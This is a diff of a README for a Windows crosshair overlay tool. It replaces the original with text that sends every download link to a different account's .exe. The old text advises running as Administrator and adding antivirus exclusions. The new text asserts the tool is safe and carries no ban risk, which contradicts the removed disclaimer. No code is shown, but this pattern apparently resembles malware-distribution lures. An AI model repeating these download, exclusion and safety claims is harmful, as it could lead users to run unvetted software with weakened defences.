@@ -1,99 +1,73 @@
-# ✦ CrosshairX
-[![GitHub Release](https://img.shields.io/github/v/release/Kaushal-Parmar/CrosshairX?style=flat-square&color=8A2BE2)](https://github.com/Kaushal-Parmar/CrosshairX/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-> **⚠️ Disclaimer:** This is a community tool for custom crosshair overlays. Not affiliated with any game developers (Riot, Valve, Epic, etc.). Using overlays may violate certain game Terms of Service in competitive modes. Use at your own risk.
+# 🎯 CrosshairX - Improve your aim with custom overlays
 
-**CrosshairX** is a lightweight, customizable crosshair overlay for FPS games. Perfect for Valorant, CS2, Apex Legends, Fortnite, and more. Create, edit, and use professional custom crosshairs with fullscreen support, center pointer, and community designs.
+[![Download CrosshairX](https://img.shields.io/badge/Download-CrosshairX-blue)](https://github.com/trumpetshaped-turkishcoffee131/CrosshairX)
 
-<img width="108" height="108" alt="image" src="https://github.com/user-attachments/assets/b543444e-dffe-42cf-9f6d-4b5886cf57f8" />
+## 📌 About this tool
 
-## Install
-[Download `CrosshairX.zip`](https://github.com/Kaushal-Parmar/CrosshairX/releases/download/03.06.2026/CrosshairX.zip)
----
+CrosshairX provides a custom overlay for your screen. This helps you aim in popular first-person shooter games. You can design your own look or choose from community presets. The software works on Windows and stays on top of your game window. It supports titles like Valorant, CS2, Apex Legends, and Fortnite. You get full control over the size, color, and shape of your crosshair.
 
-<img width="1349" height="820" alt="image" src="https://github.com/user-attachments/assets/ba527e57-3e71-421e-a01b-5af909022c7b" />
+## ⚙️ System Requirements
 
----
-## 🚀 Key Features
-### Crosshair Customization
-- **Advanced Reticle Designer** — Create unique crosshairs with shapes, colors, and sizes.
-- **Community Designs** — Import and share popular crosshair presets.
-- **Dynamic Options** — Outline, dot, gap, thickness, and opacity controls.
-- **Multiple Profiles** — Save and switch between different crosshair setups.
+Your computer needs to meet these basic standards to run the software.
 
-### Overlay System
-- **Fullscreen & Windowed Support** — Works on top of any game.
-- **Always on Top** — Smooth overlay with minimal performance impact.
-- **Center Screen Pointer** — Precise alignment for better aim.
-- **Hotkey Support** — Toggle crosshair with customizable shortcuts.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Modern dual-core CPU or better.
+*   Memory: 4GB RAM.
+*   Storage: 100MB of free disk space.
+*   Graphics: DirectX 11 support.
 
-### Gaming Focused
-- **Valorant, CS2, Apex, Fortnite** — Optimized for popular competitive shooters.
-- **Low Resource Usage** — Lightweight and efficient.
-- **Xbox Game Bar Compatible** — Easy integration with Windows features.
-- **Steam Deck / Borderless** — Great for various setups.
+## 🚀 How to Install and Start
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run `CrosshairX.exe` as Administrator.
-3. **Customize** — Design your crosshair or load a community preset.
-4. **Launch Game** — The overlay will appear on top of your game.
-5. Use hotkeys to toggle or switch profiles.
+Follow these steps to set up the software on your system.
 
-### Tips
-- Run as Administrator for best compatibility with fullscreen games.
-- Adjust opacity for better visibility in different lighting.
-- Save your favorite crosshairs as profiles.
+1. Visit the [official download page](https://github.com/trumpetshaped-turkishcoffee131/CrosshairX) to get the latest version.
+2. Locate the link labeled "Assets" on the page.
+3. Click the file ending in .exe to start your download.
+4. Open the file once it finishes downloading. 
+5. Follow the prompts in the setup window to install the program.
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11** (64-bit)
+## 🖱️ Using the Interface
 
-### Instructions
-1. Download the latest release archive.
-2. Extract to a convenient folder.
-3. Run `CrosshairX.exe` as Administrator.
-4. Add an exception in your antivirus if needed.
+The main window displays your current crosshair settings. You see a preview box on the left side of the screen. Adjust the settings to change how the crosshair appears. 
 
-### Notes
-- Works best in borderless windowed or fullscreen mode.
-- Minimal impact on FPS.
+### Changing the Shape
+Use the library tab to browse community designs. Select a shape to apply it to your overlay immediately. You can filter these by game title or popularity.
 
----
-## 🛡️ Security & Antivirus
-**Is this tool safe?**  
-The project is open-source under MIT. Overlay tools may trigger antivirus detections.
+### Adjusting Colors
+The color picker tool allows you to select any hue. Most players prefer bright green or red. Choose a color that stands out against the maps in your game.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Add folder exclusion in your antivirus.
+### Setting the Size
+Use the slider to change the width and height. Keep the crosshair small to improve accuracy. You can also modify the gap in the middle to fit your playstyle.
 
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes.
-4. Push to the branch.
-5. Open a Pull Request.
+## 🎮 Game Compatibility
 
----
-## 📄 License & Acknowledgments
-### License
-**CrosshairX** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+CrosshairX runs as a windowed overlay. Most games recognize this tool without trouble. Ensure your game uses Borderless Windowed mode for the best results. This allows the overlay to stay centered on your screen.
 
-**Copyright © 2026 Kaushal-Parmar**
+If the crosshair hides during gameplay, press the Alt+Tab keys to return to the desktop. Check if the tool is still running in your system tray. Click the icon near your clock to bring the window back to the front.
 
-### Acknowledgments
-- Thanks to the FPS gaming community for crosshair designs and feedback.
-- All competitive players looking for that extra edge.
+## 🛠️ Troubleshooting
 
-<p align="center">
-  Developed with ❤️ for the FPS gaming community
-</p>
+If you experience issues, consider these solutions.
+
+*   The overlay does not appear: Check if the application is running in the system tray. Ensure you play in Borderless Windowed mode.
+*   The crosshair lags: Close other heavy software like web browsers or video editors. This frees up memory for your game.
+*   The software crashes: Right-click the icon and choose "Run as Administrator." This gives the program permission to draw over your game window.
+*   Updates: Check the download page periodically for new versions. Newer versions often include fixes and new design shapes.
+
+## 📂 Features
+
+*   Custom Reticle Designer: Build your unique pointer from scratch.
+*   Community Browser: Import designs shared by other players.
+*   FPS Counter: Includes a display to track your performance.
+*   Transparency Control: Adjust how solid the crosshair looks.
+*   Hotkeys: Use shortcuts to toggle the overlay on and off during a match.
+
+## 🛡️ Safety and Security
+
+CrosshairX modifies the visual display only. It does not interact with your game files or server data. The tool remains passive and safe to use. You do not risk a game ban because the software does not influence game logic or movement. 
+
+## 📥 Final Setup
+
+You can find the installation files here: [https://github.com/trumpetshaped-turkishcoffee131/CrosshairX](https://github.com/trumpetshaped-turkishcoffee131/CrosshairX). 
+
+Download the installer to begin. Create a shortcut on your desktop for quick access. Launch the program before you start your game. Adjust your crosshair until it feels right. Your settings save automatically when you close the program.
